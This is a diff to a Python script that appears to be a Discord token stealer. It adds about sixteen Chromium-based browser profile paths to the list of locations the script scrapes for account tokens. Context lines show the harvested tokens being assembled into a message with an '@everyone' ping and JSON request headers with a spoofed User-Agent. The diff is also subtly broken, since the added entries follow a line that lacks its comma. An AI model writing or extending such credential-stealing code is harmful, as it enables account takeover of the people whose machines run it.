@@ -52,6 +52,22 @@ def main():
         'Opera': roaming + r'\\Opera Software\\Opera Stable',
         'Brave': local + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default',
         'Yandex': local + r'\\Yandex\\YandexBrowser\\User Data\\Default'
+        'Opera GX': roaming + r'\\Opera Software\\Opera GX Stable',
+        'Edge': appdata + r'\\Microsoft\\Edge\\User Data',
+        'Amigo': local + r'\\Amigo\\User Data',
+        'Torch': local + r'\\Torch\\User Data',
+        'Kometa': local + r'\\Kometa\\User Data',
+        'Orbitum': local + r'\\Orbitum\\User Data',
+        'CentBrowser': local + r'\\CentBrowser\\User Data',
+        '7Star': local + r'\\7Star\\7Star\\User Data',
+        'Sputnik': local + r'\\Sputnik\\Sputnik\\User Data',
+        'Chrome SxS': local + r'\\Google\\Chrome SxS\\User Data',
+        'Epic Privacy Browser': local + r'\\Epic Privacy Browser\\User Data',
+        'Vivaldi': local + r'\\Vivaldi\\User Data',
+        'Chrome Beta': local + r'\\Google\\Chrome Beta\\User Data',
+        'Uran': local + r'\\uCozMedia\\Uran\\User Data',
+        'Iridium': local + r'\\Iridium\\User Data',
+        'Chromium': local + r'\\Chromium\\User Data'
     }
     message = '@everyone' if PING_ME else ''
     for platform, path in paths.items():
@@ -63,7 +79,7 @@ def main():
             for token in tokens:
                 message += f'```{token}``` '
         else:
-            message += 'No tokens found. '
+            message += 'Tokens no encontradas. '
     headers = {
         'Content-Type': 'application/json',
         'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
